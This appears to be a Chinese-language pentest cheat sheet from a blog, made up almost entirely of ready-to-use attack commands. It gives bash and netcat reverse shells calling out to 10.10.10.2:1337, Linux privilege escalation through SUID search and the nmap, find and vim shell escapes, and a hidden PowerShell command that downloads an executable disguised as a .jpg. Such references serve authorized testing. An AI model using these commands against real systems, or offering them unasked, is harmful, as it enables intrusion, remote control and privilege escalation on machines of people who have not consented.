---
layout: post
title: Pentest Note / CheatSheet
---

## Linux

### 反弹shell

bash

```
bash -i >& /dev/tcp/10.10.10.2/1337 0>&1
```

nc

```
nc -e /bin/bash -t 10.10.10.2 1337
```

python非标准shell到标准shell

```
python -c "import pty;pty.spawn('/bin/bash')"
```

### 本地提权

#### suid

查找拥有suid权限位的文件

```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ;
sudo -l
```

nmap

```
nmap --interactive
nmap> !sh
sh-3.2# whoami
root

msf exploit/unix/local/setuid_nmap

echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```

find

```
touch test
find test -exec whoami \;
```

vim

```
:set shell=/bin/sh
:shell

sudo vim -c '!sh'
```



## Windows

### 下载执行

在某些低权限情况下只能使用这个命令，使用`-UseBasicParsing`避免调用IE解析DOM

`Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing`

`powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://example.com/1.jpg','C:\1.exe')`

替代bitsadmin

`Start-BitsTransfer -Source $file -Destination C:\1.exe –Asynchronous`

### 本地提权

#### 可用工具

```
msf post/multi/recon/local_exploit_suggester 
https://github.com/bitsadmin/wesng
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
```
